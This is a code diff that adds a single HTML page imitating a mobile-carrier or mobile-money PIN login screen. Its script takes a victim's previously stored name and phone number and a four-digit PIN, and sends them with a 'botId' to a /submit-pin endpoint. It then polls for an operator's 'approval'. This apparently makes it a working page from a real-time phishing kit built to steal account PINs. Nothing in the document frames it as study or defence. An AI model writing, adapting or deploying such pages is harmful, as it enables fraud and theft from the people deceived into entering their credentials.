@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter PIN</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #e5e5e5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .top {
+      height: 180px;
+      background: #c00000;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .back {
+      position: absolute;
+      left: 16px;
+      top: 16px;
+      font-size: 22px;
+      color: #ffffff;
+      cursor: pointer;
+    }
+
+    .pin-container {
+      flex: 1;
+      background: #ffffff;
+      padding: 24px 16px;
+    }
+
+    .pin-title {
+      text-align: center;
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .pin-row {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .pin-box,
+    .lock {
+      width: 52px;
+      height: 52px;
+      border: 1px solid #ccc;
+      background: #fafafa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+    }
+
+    button {
+      width: 100%;
+      max-width: 360px;
+      margin: 0 auto;
+      display: block;
+      padding: 16px;
+      font-size: 16px;
+      background: #c00000;
+      color: white;
+      border: none;
+      cursor: pointer;
+      opacity: 0.5;
+    }
+
+    button:enabled {
+      opacity: 1;
+      cursor: pointer;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #777;
+      margin-top: 18px;
+      text-align: center;
+    }
+
+    .status {
+      margin-top: 16px;
+      text-align: center;
+      font-size: 14px;
+      color: #0a8f55;
+      display: none;
+    }
+
+    .error {
+      color: #d32f2f;
+    }
+
+    .hidden-input {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top">
+    <div class="back" onclick="history.back()">←</div>
+  </div>
+
+  <div class="pin-container" onclick="focusPin()">
+    <div class="pin-title">Please enter your PIN</div>
+
+    <div class="pin-row">
+      <div class="pin-box" id="b1"></div>
+      <div class="pin-box" id="b2"></div>
+      <div class="pin-box" id="b3"></div>
+      <div class="pin-box" id="b4"></div>
+      <div class="lock">🔒</div>
+    </div>
+
+    <button id="loginBtn" disabled>Login</button>
+    <div id="status" class="status">⏳ Waiting for approval...</div>
+    <div class="note">Dial *110# to change PIN</div>
+  </div>
+
+  <input
+    id="pinInput"
+    class="hidden-input"
+    type="tel"
+    inputmode="numeric"
+    maxlength="4"
+  />
+
+  <script>
+    const input = document.getElementById('pinInput');
+    const loginBtn = document.getElementById('loginBtn');
+    const statusEl = document.getElementById('status');
+
+    const boxes = [
+      document.getElementById('b1'),
+      document.getElementById('b2'),
+      document.getElementById('b3'),
+      document.getElementById('b4')
+    ];
+
+    const fullName = localStorage.getItem('fullName');
+    const phone = localStorage.getItem('phone');
+    const botId = 'bot1'; // change if needed
+
+    if (!fullName || !phone) {
+      alert('Session expired. Please start again.');
+      window.location.href = 'index.html';
+    }
+
+    function focusPin() {
+      input.focus();
+    }
+
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/\D/g, '').slice(0, 4);
+
+      boxes.forEach((box, i) => {
+        box.textContent = input.value[i] ? '•' : '';
+      });
+
+      loginBtn.disabled = input.value.length !== 4;
+    });
+
+    loginBtn.addEventListener('click', async () => {
+      const pin = input.value;
+
+      loginBtn.disabled = true;
+      statusEl.style.display = 'block';
+      statusEl.classList.remove('error');
+      statusEl.textContent = '⏳ Waiting for approval...';
+
+      const res = await fetch('/submit-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: fullName,
+          phone,
+          pin,
+          botId
+        })
+      });
+
+      const { requestId } = await res.json();
+      pollPin(requestId);
+    });
+
+    function pollPin(requestId) {
+      const interval = setInterval(async () => {
+        const res = await fetch(`/check-pin/${requestId}`);
+        const data = await res.json();
+
+        if (data.approved === true) {
+          clearInterval(interval);
+          window.location.href = 'success.html';
+        }
+
+        if (data.approved === false || data.blocked) {
+          clearInterval(interval);
+
+          input.value = '';
+          boxes.forEach(b => b.textContent = '');
+          loginBtn.disabled = true;
+
+          statusEl.classList.add('error');
+          statusEl.textContent = '❌ Incorrect PIN. Please try again.';
+        }
+      }, 2000);
+    }
+
+    window.onload = () => input.focus();
+  </script>
+
+</body>
+</html>
